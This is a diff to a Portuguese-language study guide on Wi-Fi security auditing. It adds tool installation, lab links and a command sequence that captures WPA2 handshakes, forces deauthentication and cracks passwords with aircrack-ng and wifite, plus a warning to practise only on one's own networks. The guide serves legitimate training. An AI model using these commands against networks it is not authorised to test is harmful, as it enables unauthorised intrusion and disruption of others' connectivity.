@@ -4,6 +4,14 @@
 
 ---
 
+## 🛠️ Instalação
+
+```bash
+sudo apt install -y aircrack-ng kismet wifite
+```
+
+---
+
 ## 🚀 Passo a Passo
 
 ### Pré-requisito: placa em modo monitor
@@ -66,3 +74,40 @@ sudo wifite --kill
 
 - WPA3, PMF, desativar WPS, 802.1X (Enterprise)
 - Detectar deauth com `kismet` + WIDS
+
+---
+
+## 🧪 Labs Práticos
+
+### TryHackMe
+- **[Wi-Fi Hacking](https://tryhackme.com/room/wifihacking101)** — Fundamentos de auditoria wireless
+- **[WPA2 Cracking](https://tryhackme.com/room/aircrack-ng)** — Captura e quebra de handshake WPA2
+
+### HackTheBox
+- **[Wireless Challenges](https://app.hackthebox.com/challenges/wireless)** — Desafios de rede wireless
+
+### Exercícios Locais
+```bash
+# Listar redes com airodump-ng
+sudo airodump-ng wlan0mon
+
+# Capturar handshake em rede de teste (AP próprio)
+sudo airodump-ng -c 6 --bssid XX:XX:XX:XX:XX:XX -w lab_capture wlan0mon
+
+# Forçar deauth (apenas em AP próprio/lab)
+sudo aireplay-ng -0 5 -a XX:XX:XX:XX:XX:XX wlan0mon
+
+# Quebrar com rockyou.txt
+aircrack-ng -w /usr/share/wordlists/rockyou.txt lab_capture-01.cap
+
+# Usar Wifite para automação
+sudo wifite --kill --wpa --dict /usr/share/wordlists/rockyou.txt
+```
+
+### Desafio Integrado
+1. Configure um AP com WPA2 (hostapd) como target
+2. Capture handshake com airodump-ng + deauth
+3. Quebre a senha com aircrack-ng
+4. Documente tempo e método utilizado
+
+> **ATENÇÃO:** Pratique apenas em redes próprias ou em lab isolado. Sniffing em redes alheias é crime (Art. 154-A do Código Penal).
